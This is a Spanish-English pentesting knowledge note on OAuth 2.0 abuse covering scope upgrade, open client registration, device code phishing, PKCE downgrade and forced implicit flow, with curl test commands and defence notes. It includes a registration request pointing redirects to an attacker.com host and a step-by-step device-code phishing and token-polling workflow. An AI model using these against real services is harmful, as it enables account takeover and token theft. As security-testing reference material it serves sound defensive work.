---
aliases:
  - OAuth Scope Abuse
  - OAuth Consent Abuse
  - OAuth PKCE Bypass
tags:
  - vuln/oauth
  - technique/privilege-escalation
  - technique/exploitation
primary: "[[OAuth 2.0 Misconfigurations]]"
---

# OAuth 2.0 - Scope, Consent & Flow Abuse

Ataques contra el meaning del flow: escalar scope, evadir consent, abusar variants menos seguros (implicit, device).

## Scope Upgrade / Silent Re-Consent

Una vez user otorgó consent inicial, providers suelen omitir re-consent si new request es subset o "compatible". Atacante explota silent grant para escalar scopes sin awareness.

| Vector | Cómo | Resultado |
|--------|------|-----------|
| **Scope superset trick** | Client request `scope=email`, después request `scope=email admin` con `prompt=none` | Si server emite token con `admin` sin re-prompt = vuln |
| **Implicit cumulative grants** | Algunos providers acumulan scopes pre-grantados | Atacante consume scope mayor |
| **Scope downgrade y re-upgrade** | Reset consent a low scope, después re-request high scope con auto-grant | Bypass UI |
| **Client_id swap** | Client A grantado, cliente B pide scope similar → si silent | Cross-client scope leak |
| **Refresh token con scope upgrade** | `refresh_token` request con `scope=admin` (mayor que original) | Algunos servers aceptan |
| **Hybrid flow scope discrepancy** | `id_token` scopes ≠ `access_token` scopes | Attacker exploita el token con más scopes |

```bash
# Test silent upgrade
# 1. Atacante's app obtiene token inicial con scope=email
# 2. Refresh con scope ampliado
curl -X POST https://target/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=RT_VALUE" \
  -d "scope=email admin internal" \
  -d "client_id=APP" -d "client_secret=SECRET"
# Si returns token con scope=admin (no granted by user) → vuln
```

Defensa: scope validation strict, refresh tokens nunca emitan token con scope mayor al original.

^oauth-abuse-scope

## Dynamic Client Registration Abuse

RFC 7591 permite registrar clients programáticamente via `POST /register`. Si endpoint expuesto sin auth, atacante registra client con redirect_uri controlado → todo otro ataque trivial.

| Misconfiguration | Exploit | Resultado |
|------------------|---------|-----------|
| `/register` público sin auth | `POST` con JSON body atacante | Registra client malicioso |
| `/register` con bearer débil | Default token guess | Same |
| Software statement no validated | JWT registration sin issuer check | Atacante crea fake registration JWT |
| Tipo `confidential` sin verify | Atacante claims confidential pero no aporta secret | Server lo trata as confidential |
| Redirect_uri sin restrictions | Registrar con `redirect_uris=["https://attacker.com/cb"]` | Trivial code theft |

```bash
# Test endpoint
curl -X POST https://target/oauth/register \
  -H 'Content-Type: application/json' \
  -d '{
    "client_name": "MaliciousApp",
    "redirect_uris": ["https://attacker.com/cb"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "scope": "openid email profile admin"
  }'

# Si returns client_id/client_secret → server permite registro abierto
# Atacante usa este client_id/secret para flows posteriores
```

Defensa: `/register` con auth (initial access token), software statement validation, restrict scopes/redirect_uris allowlist.

^oauth-abuse-registration

## Device Code Phishing

Device flow (`urn:ietf:params:oauth:grant-type:device_code`) diseñado para devices sin browser (TVs, IoT). Genera código user ingresa en su browser para auth. Atacante phishea código → víctima auth atacante's device.

| Step | Atacante | Víctima |
|------|----------|---------|
| 1 | Inicia device flow contra target → recibe `user_code=ABCD-1234` | — |
| 2 | Manda email phishing: "Confirma tu cuenta en https://target/device — código ABCD-1234" | — |
| 3 | — | Víctima visita URL, ingresa código, auth con sus credentials |
| 4 | Atacante's device ahora autenticado como víctima | — |
| 5 | Atacante poll `/token` endpoint → recibe access_token víctima | — |

```bash
# Step 1 atacante
curl -X POST https://target/oauth/device/code \
  -d "client_id=APP" -d "scope=email"
# Response:
# {
#   "device_code": "long_random_string",
#   "user_code": "ABCD-1234",
#   "verification_uri": "https://target/device",
#   "interval": 5
# }

# Step 5 atacante poll
while true; do
  RESP=$(curl -X POST https://target/oauth/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "device_code=long_random_string" \
    -d "client_id=APP")
  echo "$RESP" | grep -q access_token && break
  sleep 5
done
```

Defensa: short user_code TTL (~5 min), rate limit polling, mostrar app name claramente, require user verification step adicional.

Microsoft, Google, GitHub han sido targets reales de device code phishing en threat actor reports 2023-2024.

^oauth-abuse-devicephishing

## PKCE Downgrade

PKCE (RFC 7636) bindea `code_verifier` al code → atacante con code robado no puede exchange. Bypass: downgrade el flow para evitar PKCE check.

| Bug | Exploit |
|-----|---------|
| **PKCE opcional en server** | Atacante exchanges code sin `code_verifier` → server acepta |
| **`code_challenge_method=plain`** | `verifier == challenge` plain text — sin hash | Sniff challenge = exchange code |
| **Server no valida method match** | Cliente registró `S256`, atacante envía `plain` | Downgrade |
| **Verifier brute** | Si verifier corto, atacante brute force | Long verifiers required |
| **Reuse code_verifier** | Mismo verifier across sessions | Predictable |

```bash
# Test si PKCE es opcional
# 1. Inicia flow con code_challenge=ABC&code_challenge_method=S256
# 2. Captura code emitido
# 3. Exchange sin code_verifier:
curl -X POST https://target/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "redirect_uri=https://known.com/cb" \
  -d "client_id=APP"
  # ↑ omite code_verifier
# Si returns access_token → PKCE no enforced
```

Defensa server: si flow inició con `code_challenge`, exchange MUST require `code_verifier`. Reject `plain` method para confidential clients (solo public clients legacy).

^oauth-abuse-pkce

## Implicit Flow Forced

OAuth 2.1 deprecó implicit, pero apps legacy lo soportan. Si server acepta `response_type=token` aún cuando spec recomienda Code+PKCE, atacante fuerza downgrade para token en URL fragment (más fácil de robar).

| Vector | Cómo | Resultado |
|--------|------|-----------|
| **Force implicit en client moderno** | Cambiar `response_type=code` → `response_type=token` | Token expuesto en fragment |
| **Hybrid abuse** | `response_type=code id_token token` | Token + code en fragment |
| **Fragment fixation** | Fragment persiste cross-redirect en algunos browsers | Replay |
| **Mobile webview default** | Algunos webviews exponen URL post-redirect | Token leak |

```http
# Atacante manipula request user
GET /oauth/authorize?
  client_id=APP&
  response_type=token&  ← forzado, no el original code
  redirect_uri=https://attacker-controlled-via-other-bug/cb&
  scope=email
```

Combo común: implicit forced + redirect_uri parser confusion = token directo a atacante sin server intercambio.

Defensa: server rechaza `response_type` no registrados por client. Client config explicit `response_types_allowed=["code"]`.

^oauth-abuse-implicit
